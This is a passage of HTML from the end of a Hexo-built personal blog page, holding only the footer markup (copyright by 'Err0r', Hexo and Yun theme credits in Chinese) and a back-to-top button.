class="copyright"><span>&copy; 2019 – 2023 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Err0r</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.9</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>
